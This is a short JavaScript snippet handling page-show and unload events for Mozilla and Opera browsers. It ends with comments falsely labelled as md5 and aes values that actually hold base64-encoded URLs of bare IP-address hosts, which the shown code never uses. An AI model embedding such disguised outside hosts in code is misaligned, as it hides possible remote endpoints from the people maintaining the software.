if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjkyLjEzMi4xOTM6ODAwOC8saHR0cDovLzEyMC43OC4xOTQuNzA6ODAwOA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/